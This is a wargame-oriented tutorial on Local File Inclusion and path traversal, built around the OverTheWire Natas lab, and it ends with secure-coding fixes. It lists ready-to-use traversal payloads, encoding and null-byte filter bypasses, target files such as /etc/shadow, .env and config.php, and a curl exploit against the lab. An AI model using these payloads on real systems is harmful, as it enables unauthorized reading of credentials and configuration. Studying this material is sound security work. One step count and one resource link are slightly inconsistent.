# 🌐 Web Security — Local File Inclusion (LFI) & Path Traversal

> If the application asks you which file to display,
> you can name whatever file you want.

---

## 📋 Table of Contents

- [What Is Path Traversal?](#what-is-path-traversal)
- [What Is LFI?](#what-is-lfi)
- [Directory Traversal with ../](#directory-traversal-with-)
- [Target Files](#target-files)
- [Filter Bypass Techniques](#filter-bypass-techniques)
- [Usage in Natas](#usage-in-natas)

---

## What Is Path Traversal?

If the application takes a file's path from the user and doesn't validate it, the user can climb up the file system with `../` sequences and access unauthorized files.

```
Normal request:
  ?file=welcome.txt
  /var/www/html/files/welcome.txt  ✓

Path Traversal:
  ?file=../../../../etc/passwd
  /var/www/html/files/../../../../etc/passwd
  → /etc/passwd  ✓ (the server reads this)
  # /var/www/html/files/ is 4 levels deep from root → 4 ../ are needed to reach root
  # (3 ../ only climb up to /var and give /var/etc/passwd)
```

This attack can be used both to read local files (LFI) and for remote resources (RFI).

---

## What Is LFI?

**Local File Inclusion** arises in cases where PHP functions like `include()` or `require()` are controlled by user input.

```php
// Dangerous code:
$page = $_GET['page'];
include($page);
```

If the user types `page=welcome.php`, the application includes the `welcome.php` file. But if they type `page=../../../../etc/passwd`, it includes the `/etc/passwd` file — and prints its contents to the screen.

### The Difference Between Path Traversal and LFI

| | Path Traversal | LFI |
|--|----------------|-----|
| Function | `file_get_contents`, `readfile`, `fopen` | `include`, `require` |
| Result | The file contents are read | The file is executed as PHP (or read) |
| Danger | File reading | File reading + code execution |

In practice the two are used together, and in Natas both appear as "file reading."

---

## Directory Traversal with ../

In the Unix file system:

```
.   → current directory
..  → one directory up
/   → root directory
```

```
/var/www/html/pages/          ← the application includes from here
          ↑
          One up:   /var/www/html/
          Two up:   /var/www/
          Three up: /var/
          Four up:  /
```

If you don't know how many `../` are needed, adding too many doesn't hurt:

```
../../../../../../../../etc/passwd
```

Once you reach the root directory, extra `../` are ignored — `/../../etc/passwd` is still `/etc/passwd`.

### Step by Step

```
Application path: /var/www/html/pages/
Target file:      /etc/natas_webpass/natas8

The difference:
  /var/www/html/pages/ → I need to go up 4 levels → ../../../../
  Then: etc/natas_webpass/natas8

Payload: ../../../../etc/natas_webpass/natas8
```

---

## Target Files

Common files attempted via LFI/Path Traversal:

### Linux System Files

```
/etc/passwd              → user list
/etc/shadow              → password hashes (requires root privileges)
/etc/hosts               → hosts file
/etc/hostname            → server name
/proc/self/environ       → environment variables (for log poisoning)
/proc/version            → kernel version
```

### Web Server Files

```
/etc/apache2/apache2.conf       → Apache settings
/etc/nginx/nginx.conf           → Nginx settings
/var/log/apache2/access.log     → Apache access log (log poisoning)
/var/log/apache2/error.log      → Apache error log
```

### PHP / Application Files

```
/var/www/html/config.php        → database password
/var/www/html/.env              → environment variables
../config/database.php          → DB connection info
```

### Specific to Natas

```
/etc/natas_webpass/natas[X]     → the levels' passwords are here
```

---

## Filter Bypass Techniques

The application may filter the `../` characters or the target paths.

### 1. Adding Extra ../

If you don't know how many parent directories there are:

```
../../../../../../../../../../../../etc/passwd
```

### 2. URL Encoding

```
../     →   %2e%2e%2f
../     →   ..%2f
../     →   %2e%2e/
```

Double encoding:

```
../     →   %252e%252e%252f    (% → %25)
```

### 3. Null Byte (PHP 5.3 and earlier)

In old PHP versions, `%00` (null byte) terminates the string:

```php
include($page . ".php");

// Payload:
?page=../../../../etc/passwd%00
// → include("/etc/passwd\0.php") → /etc/passwd is read
```

> Note: This doesn't work in PHP 5.3.4+ versions.

### 4. Path Normalization Bypass

```
....//....//etc/passwd      # // is normalized but .... may behave like a double ..
..././..././etc/passwd       # in some filters
```

### 5. Encoding Combinations

```
%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
```

### 6. Absolute Path

If the application only filters `../` and accepts an absolute path:

```
?page=/etc/passwd
?page=/etc/natas_webpass/natas8
```

---

## Usage in Natas

### Natas 7 — Basic LFI

**Source code:**

```php
<?php
// Hint: password for webuser natas8 can be found in /etc/natas_webpass/natas8
?>
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<?php
if(array_key_exists("page", $_REQUEST) && !is_null($_REQUEST["page"])) {
    include($_REQUEST["page"]);
}
?>
```

**Analysis:**

- The `page` parameter goes directly to the `include()` function
- There is no filtering
- The password is at the location `/etc/natas_webpass/natas8`

**Exploit:**

```
URL: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

The absolute path works directly — not even `../` is needed.

**With curl:**

```bash
curl -u natas7:[password] \
     "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

**Lesson learned:** Using `include($_GET['page'])` is the simplest form of LFI. If there is no filtering, an absolute path works directly.

---

### Calculating How Many ../ Are Needed

```
Application directory: /var/www/html/
                       ^   ^   ^   ^
                       1   2   3   4th level

Target: /etc/natas_webpass/natas8

/var/www/html/ → go up 3 → /
../../../../etc/natas_webpass/natas8
^ 4 of them (extra doesn't hurt)
```

If you're not sure:

```
../../../../../../../../../../../../../../etc/natas_webpass/natas8
```

---

### LFI — Checklist

```
Check in the source code:
  ☐ Are include(), require(), include_once(), require_once() present?
  ☐ Are file_get_contents(), readfile(), fopen() present?
  ☐ Does the parameter go directly to this function?
  ☐ Is there filtering? What does it filter?

Check in the URL:
  ☐ Are there parameters like ?page=, ?file=, ?path=, ?template=?
  ☐ Try an absolute path: ?page=/etc/passwd
  ☐ Try with ../ : ?page=../../../../etc/passwd
  ☐ Try URL encoding: ?page=..%2F..%2Fetc%2Fpasswd

Target:
  ☐ /etc/natas_webpass/natas[X] (for Natas)
  ☐ /etc/passwd (to learn about the system)
  ☐ Source php files (config.php, index.php)
```

---

### What Should Secure Code Look Like?

```php
// BAD
$page = $_GET['page'];
include($page);

// GOOD — use a whitelist
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    include('home.php');
}

// BETTER — normalize with realpath and check
$page = realpath('/var/www/html/pages/' . $_GET['page']);
$base = '/var/www/html/pages/';

if (strpos($page, $base) === 0) {
    include($page);
}
```

---

## 🔗 Resources

- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger — File Inclusion](https://portswigger.net/web-security/file-path-traversal)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings — LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

**Previous topic:** [07_command_injection.md](./07_command_injection.md)
**Next topic:** [09_xor_encryption.md](./09_xor_encryption.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
